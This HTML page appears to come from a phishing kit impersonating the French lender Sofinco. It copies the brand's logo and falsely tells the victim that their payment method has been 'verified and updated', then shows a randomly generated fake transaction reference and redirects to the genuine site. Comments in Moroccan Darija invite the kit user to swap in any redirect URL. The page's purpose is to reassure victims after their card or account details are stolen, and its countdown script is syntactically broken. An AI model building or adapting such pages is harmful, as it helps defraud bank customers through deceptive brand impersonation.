<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="files/favicon.ico">
    <title>Confirmation de paiement</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: sans-serif;
        }
        body {
            background-color: #f4f7f9;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        /* Header */
        header {
            background-color: #ffffff;
            padding: 18px 24px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: flex-start;
            align-items: center;
            width: 100%;
        }
        .logo-container {
            width: 160px;
            display: flex;
            align-items: center;
        }
        .header__logo {
            width: 100%;
            height: auto;
            display: block;
        }
        /* Container principal */
        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .success-card {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 36, 55, 0.05);
            width: 100%;
            max-width: 450px;
            padding: 40px 30px;
            border: 1px solid #e6ecf0;
            text-align: center;
        }

        /* Success Icon Animation */
        .success-icon-wrapper {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 72px;
            height: 72px;
            background-color: #f0fdf4;
            border-radius: 50%;
            margin-bottom: 24px;
            border: 2px solid #bbf7d0;
        }
        .success-icon-wrapper svg {
            color: #16a34a;
        }
        
        .title {
            color: #002437;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 12px;
        }
        .subtitle {
            color: #5d717d;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        /* Cadre dyal récapitulatif khfif */
        .recap-box {
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 30px;
            text-align: left;
        }
        .recap-row {
            display: flex;
            justify-content: space-between;
            font-size: 13.5px;
            color: #4b5563;
            margin-bottom: 8px;
        }
        .recap-row:last-child {
            margin-bottom: 0;
        }
        .recap-label {
            font-weight: 500;
        }
        .recap-value {
            font-weight: 600;
            color: #002437;
        }

        /* Bouton ou info redirection */
        .redirection-text {
            font-size: 13px;
            color: #94a3b8;
            margin-top: 15px;
        }
        .countdown-num {
            font-weight: bold;
            color: #16a34a;
        }

        .btn-home {
            display: inline-block;
            width: 100%;
            background-color: #002437;
            color: #ffffff;
            text-decoration: none;
            padding: 14px;
            font-size: 15px;
            font-weight: bold;
            border-radius: 4px;
            transition: background-color 0.2s;
        }
        .btn-home:hover {
            background-color: #00334D;
        }

        /* Responsive Mobile View */
        @media (max-width: 480px) {
            header {
                padding: 12px 16px;
            }
            .logo-container {
                width: 130px;
            }
            .main-container {
                padding: 10px;
                align-items: flex-start;
                margin-top: 20px;
            }
            .success-card {
                padding: 30px 20px;
                border-radius: 6px;
            }
            .title {
                font-size: 20px;
            }
            .subtitle {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>

  <header>
        <div class="logo-container">
            <div data-v-1d7cb465="" class="header__logo-box header__logo-box--xs-visible">
                <a data-v-1d7cb465="" aria-current="page" class="router-link-active router-link-exact-active" aria-label="Retour page d'accueil" tabindex="0" role="link">
                    <svg data-v-1d7cb465="" viewBox="0 0 446 101" fill="none" xmlns="http://www.w3.org/2000/svg" class="header__logo">
                        <path d="M42.6409 43.4746C27.2111 39.5129 23.3537 37.6363 23.3537 31.798V31.5895C23.3537 27.2107 27.3154 23.7703 34.8218 23.7703C42.3281 23.7703 50.1473 27.1065 58.0707 32.5278L68.2877 17.7235C59.2175 10.4256 48.1664 6.35968 35.1345 6.35968C22.1026 6.35968 3.85792 17.098 3.85792 33.2576V33.4661C3.85792 51.1895 15.4303 56.1937 33.4664 60.781C48.3749 64.6384 51.3984 67.1405 51.3984 72.1448V72.3533C51.3984 77.5661 46.6026 80.798 38.4707 80.798C30.3388 80.798 19.9132 76.6278 11.7813 69.9554L0.208984 83.8214C10.9473 93.4129 24.6047 98.1044 38.0537 98.1044C57.3409 98.1044 70.7898 88.2001 70.7898 70.4767V70.2682C70.7898 54.7341 60.5728 48.1661 42.5367 43.4746H42.6409Z" fill="#00334D"></path>
                        <path d="M114.16 27.3151C92.8917 27.3151 77.0449 43.2662 77.0449 62.8662V63.0747C77.0449 82.6747 92.6832 98.4172 113.847 98.4172C135.011 98.4172 150.962 82.4662 150.962 62.8662V62.6577C150.962 43.0577 135.324 27.3151 114.16 27.3151ZM131.883 63.0747C131.883 73.1874 125.211 81.7364 114.16 81.7364C103.109 81.7364 96.2279 72.9789 96.2279 62.8662V62.6577C96.2279 52.5449 102.9 44.1002 113.951 44.1002C124.69 44.1002 131.883 52.8576 131.883 62.9704V63.1789V63.0747Z" fill="#00334D"></path>
                        <path d="M180.362 23.8747C180.362 18.7662 182.864 16.4725 187.347 16.4725C191.83 16.4725 193.29 17.0981 196.105 18.1406V2.08531C192.56 0.9385 188.494 0.20871 182.343 0.20871C175.462 0.20871 170.249 1.98106 166.705 5.52574C163.16 9.07042 161.179 14.5959 161.179 22.1023V29.1917H153.151V45.1428H161.179V96.8534H180.571V45.1428H207.468V96.8534H226.86V29.2959H180.362V23.8747Z" fill="#00334D"></path>
                        <path d="M278.153 27.3151C268.353 27.3151 262.619 32.5279 258.136 38.2619V28.5662H238.745V96.8534H258.136V58.696C258.136 49.5215 262.828 44.83 270.23 44.83C277.632 44.83 281.906 49.5215 281.906 58.696V96.8534H301.298V52.6491C301.298 37.0108 292.749 27.3151 278.049 27.3151H278.153Z" fill="#00334D"></path>
                        <path d="M216.017 23.3534C221.855 23.3534 226.546 18.6619 226.546 12.8236C226.546 6.98532 221.855 2.29382 216.017 2.29382C210.178 2.29382 205.487 6.98532 205.487 12.8236C205.487 18.6619 210.178 23.3534 216.017 23.3534Z" fill="#00334D"></path>
                        <path d="M344.877 81.736C334.347 81.736 327.57 73.2913 327.57 62.8658V62.6572C327.57 52.5445 334.451 44.0998 344.147 44.0998C353.843 44.0998 355.406 47.0189 359.681 51.6062L371.566 38.887C365.206 31.6934 357.179 27.4189 344.251 27.4189C323.4 27.4189 308.387 43.4743 308.387 62.97V63.1785C308.387 82.6743 324.364 98.2028 343.938 98.5211C355.892 98.7155 365.206 93.3083 371.879 86.0104L360.515 74.5423C355.823 79.0253 351.34 81.8402 344.877 81.8402V81.736Z" fill="#00334D"></path>
                        <path d="M408.994 27.3151C387.726 27.3151 371.879 43.2662 371.879 62.8662V63.0747C371.879 82.6747 387.517 98.4172 408.681 98.4172C429.845 98.4172 445.796 82.4662 445.796 62.8662V62.6577C445.796 43.0577 430.158 27.3151 408.994 27.3151ZM426.717 63.0747C426.717 73.1874 420.045 81.7364 408.994 81.7364C397.943 81.7364 391.062 72.9789 391.062 62.8662V62.6577C391.062 52.5449 397.734 44.1002 408.785 44.1002C419.524 44.1002 426.717 52.8576 426.717 62.9704V63.1789V63.0747Z" fill="#00334D"></path>
                    </svg>
                </a>
            </div>
        </div>
    </header>

    <main class="main-container">
        <div class="success-card">
            
            <div class="success-icon-wrapper">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
            </div>

            <h1 class="title">Validation réussie</h1>
            <p class="subtitle">Votre moyen de paiement a été vérifié et mis à jour avec succès. Vos services restent actifs sans interruption.</p>
            
            <div class="recap-box">
                <div class="recap-row">
                    <span class="recap-label">Statut :</span>
                    <span class="recap-value" style="color: #16a34a;">Confirmé</span>
                </div>
                <div class="recap-row">
                    <span class="recap-label">Type d'opération :</span>
                    <span class="recap-value">Mise à jour sécurité</span>
                </div>
                <div class="recap-row">
                    <span class="recap-label">Référence :</span>
                    <span class="recap-value" id="ref-number">TX-98230B</span>
                </div>
            </div>

            <a href="https://mon-espace-client.sofinco.fr/" class="btn-home">Retour à mon espace client</a>
            
            <p class="redirection-text">
                Redirection automatique dans <span class="countdown-num" id="timer">quelques</span> secondes...
            </p>

        </div>
    </main>

    <script>
        // Générer une référence d'opération aléatoire
        const randRef = "TX-" + Math.floor(100000 + Math.random() * 900000) + "B";
        document.getElementById('ref-number').textContent = randRef;

        // Compteur (Countdown) dyal redirection
        let seconds = 5;
        const timerElement = document.getElementById('timer');
        
        const countdown = setInterval(() => {
            seconds--;
            timerElement.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(countdown);
                // Redirection dyal l'utilisateur (bdel l'URL b dik li bghiti)
                window.location.href = "https://www.sofinco.fr/"; 
            
        }, 15000);
    </script>

</body>
</html>